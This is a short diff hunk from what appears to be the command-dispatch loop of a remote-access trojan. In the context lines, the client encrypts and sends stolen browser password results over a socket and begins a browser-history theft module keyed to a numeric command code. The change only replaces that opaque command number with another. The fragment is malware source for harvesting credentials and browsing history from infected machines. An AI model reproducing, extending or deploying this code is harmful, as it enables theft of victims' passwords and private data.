@@ -446,7 +446,7 @@ while True:
                     eno_password = browser_password_AES.encrypt("Could not get passwords")
                     send_one_message(s, eno_password)
 
-        elif int(float(command)) == 57449330:
+        elif int(float(command)) == -120590662:
             browser_history_AES = AES256()
 
             ae_key15 = browser_password_AES.get_key()
